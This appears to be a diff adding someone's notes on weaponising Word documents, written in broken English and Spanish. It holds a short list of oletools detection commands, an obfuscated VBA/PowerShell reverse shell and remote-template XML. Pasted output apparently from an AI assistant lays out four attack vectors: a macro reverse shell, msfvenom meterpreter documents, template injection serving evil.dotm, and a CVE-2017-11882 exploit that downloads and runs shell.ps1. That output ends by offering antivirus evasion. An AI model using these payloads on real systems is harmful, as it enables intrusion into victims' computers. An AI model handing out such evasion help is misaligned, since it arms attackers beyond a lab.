@@ -1,0 +1,214 @@
+2026-03-31
+In this file im going to make notes abou Word, .docs, and xml
+
+word is a Microsft tool designed for translate string content called xml (programing lengauge) that allow 
+us to make word visible to other and our computers.
+
+knowing this we can see word as "program" that carry data and delivery to the hardware
+
+this is were the vulnerability is.
+because Windows trust any Word file, because its in the system
+
+if you change the .docs to a .zip 
+you will be able to see the content xml that is hide 
+in the program and start building payloads 
+
+
+#### DEFENSIVE ####
+
+to know if a file is poison, use tools
+ejample of tools:
+
+ oletools / olevba                                                           
+                                                                              
+  olevba documento.docx          # extrae y analiza VBA                       
+  oledump.py documento.docx      # inspecciona streams OLE                    
+  mraptor documento.docx         # detecta macros sospechosas                 
+                                                                              
+  # Para PDFs                                                                 
+  pdf-parser.py archivo.pdf      # inspecciona objetos                        
+  peepdf archivo.pdf             # análisis interactivo                       
+                                                                              
+  # Ver el XML crudo                                                          
+  unzip -p documento.docx word/document.xml | xmllint --format -              
+  unzip -p documento.docx word/_rels/document.xml.rels
+
+
+
+
+
+
+
+#### Ofensive ####
+
+on the ofensive side is were stuff get spicy ;)
+
+one way to make a payload is by make the payload less obvious, 
+this is because todays date cibersegurity is getting stroner 
+
+allways assumed that a basic attack will always not work 
+because todays tech structure is better and stronger 
+
+and thats why we have to be smart to avoid security checks 
+one way is by 
+
+python: 
+Dim payload As String
+payload = Split("p o w e r s h e l l   -N o P   -N o n I   -W   H i d d e n   -E x e c   B y p a s s", " "): payload = Join(payload, "")
+
+payload = payload & " -c " & Chr(34) & "$c=New-Object Net.Sockets.TCPClient('" & "192.168.56.10" & "',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbytes=([Text.Encoding]::ASCII).GetBytes($sb2);$s.Write($sbytes,0,$sbytes.Length);$s.Flush()}" & Chr(34)
+
+all of this payload have to be added on the { Word>_reels>document.xml.reels  }
+
+by editing with your code editor 
+
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1"
+    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
+    Target="evil.dotm" <========== this is were you want to acces to the other person being a directory or specific file
+    TargetMode="External"/>
+</Relationships>
+
+(@note this is a obvius way there are way to make it sniky)
+
+
+and zip it again 
+^^ cd ..
+^^ zip -r payload_local.docx doc_test/*
+
+(@note this have to be a unique file in the other computer if not it will be say that it cannot find that file)
+you have to host this on a web or a localhost
+
+#### claude 
+
+
+
+
+                                                                              
+● Perfecto, con ese contexto tiene sentido. Vamos al detalle técnico.         
+                                                                              
+  ---                                                                         
+  Setup mínimo del lab primero
+                                                                              
+  [ Kali/Parrot ] ←→ [ red interna NAT ] ←→ [ Windows VM víctima ]
+        ↑                                              ↑                      
+    genera payload                              abre el doc                   
+    levanta listener                            sin acceso a internet real    
+                                                                              
+  Importante: En VirtualBox/VMware, pon ambas VMs en red "Host-Only" o        
+  "Internal Network". Nada sale a internet.                                   
+                                                                              
+  ---             
+  Vector 1 — Macro VBA clásica (el más didáctico)
+                                                                              
+  En la VM Windows, crea un .docm manualmente:
+                                                                              
+  Word → Developer → Visual Basic → Insert Module                             
+                                                                              
+  Sub AutoOpen()                                                              
+      Dim payload As String                                                   
+      ' Reverse shell hacia tu Kali (IP interna)                              
+      payload = "powershell -NoP -NonI -W Hidden -Exec Bypass "               
+      payload = payload & "-c ""$c=New-Object                                 
+  Net.Sockets.TCPClient('192.168.56.10',4444);"                               
+      payload = payload & "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"       
+      payload = payload & "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"        
+      payload = payload & "$d=(New-Object                                     
+  Text.ASCIIEncoding).GetString($b,0,$i);"                                    
+      payload = payload & "$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS          
+  '+(pwd).Path+'> ';"                                                         
+      payload = payload & "$sbytes=([Text.Encoding]::ASCII).GetBytes($sb2);"
+      payload = payload & "$s.Write($sbytes,0,$sbytes.Length);$s.Flush()}"" " 
+      Shell payload                                                           
+  End Sub                                                                     
+                                                                              
+  En Kali, antes de abrir el doc:                                             
+  nc -lvnp 4444   
+                                                                              
+  ---                                                                         
+  Vector 2 — msfvenom (más automatizado)
+                                                                              
+  # Genera el .docm con payload embebido
+  msfvenom -p windows/x64/meterpreter/reverse_tcp \                           
+    LHOST=192.168.56.10 \                                                     
+    LPORT=4444 \                                                              
+    -f docm \                                                                 
+    -o test_payload.docm                                                      
+                                                                              
+  # Levanta el handler en Metasploit                                          
+  msfconsole -q -x "                                                          
+    use exploit/multi/handler;                                                
+    set payload windows/x64/meterpreter/reverse_tcp;                          
+    set LHOST 192.168.56.10;                                                  
+    set LPORT 4444;                                                           
+    run"                                                                      
+                                                                              
+  ---                                                                         
+  Vector 3 — Template Injection (más sigiloso, pasa AV)                       
+                                                                              
+  El doc .docx queda limpio — el payload está en la plantilla remota.
+                                                                              
+  Paso 1: Crea evil.dotm con la macro AutoOpen (igual que vector 1).          
+                                                                              
+  Paso 2: Sirve el archivo desde Kali:                                        
+  python3 -m http.server 8080
+  # evil.dotm accesible en http://192.168.56.10:8080/evil.dotm                
+                                                                              
+  Paso 3: En un .docx normal, edita el XML:                                   
+  mkdir doc_test && cd doc_test                                               
+  unzip documento_limpio.docx -d .                                            
+                                                                              
+  # Edita word/_rels/settings.xml.rels                                        
+                                                                              
+  <?xml version="1.0" encoding="UTF-8" standalone="yes"?>                     
+  <Relationships                                                              
+  xmlns="http://schemas.openxmlformats.org/package/2006/relationships">       
+    <Relationship Id="rId1"                                                   
+      Type="http://schemas.openxmlformats.org/officeDocument/2006/relationship
+  s/attachedTemplate"                                                         
+      Target="http://192.168.56.10:8080/evil.dotm"                            
+      TargetMode="External"/>                                                 
+  </Relationships>                                                            
+                                                                              
+  # Reempaca el docx                                                          
+  zip -r ../payload_limpio.docx .                                             
+                                                                              
+  El .docx final no tiene macros — pasa scanners básicos. Al abrir, Word      
+  descarga y carga evil.dotm.                                                 
+                                                                              
+  ---             
+  Vector 4 — CVE-2017-11882 (Equation Editor, sin macros)
+                                                                              
+  # Con pip install, hay un PoC clásico
+  git clone https://github.com/embedi/CVE-2017-11882                          
+  cd CVE-2017-11882                                                           
+                                                                              
+  python exploit.py \                                                         
+    -c "cmd.exe /c powershell -c IEX(New-Object                               
+  Net.WebClient).DownloadString('http://192.168.56.10:8080/shell.ps1')" \     
+    -o test_eq.doc
+                                                                              
+  Solo funciona en Windows sin parchar (Office 2007-2016 sin updates). Ideal  
+  para practicar en un Windows desactualizado de lab.                         
+                                                                              
+  ---             
+  Para análisis completo del ciclo
+                                                                              
+  # Después de ejecutar, analiza qué hizo el doc con oletools
+  olevba test_payload.docm        # extrae el VBA                             
+  oledump.py test_payload.docm    # ve los streams OLE                        
+                                                                              
+  Y en la VM Windows, activa Sysmon antes de abrir cualquier doc — ves        
+  exactamente qué procesos crea, qué conexiones abre, qué archivos toca. Eso  
+  es lo más valioso para entender la cadena completa de ataque/defensa.       
+                  
+  ---                                                                         
+  ¿Quieres profundizar en alguno de estos vectores específicamente, o pasamos
+  a técnicas de evasión de AV para el lab?                                    
+                  
+✻ Cogitated for 34s                                                           
+
+
+
+Copyright (c) 2026 Author. All Rights Reserved.
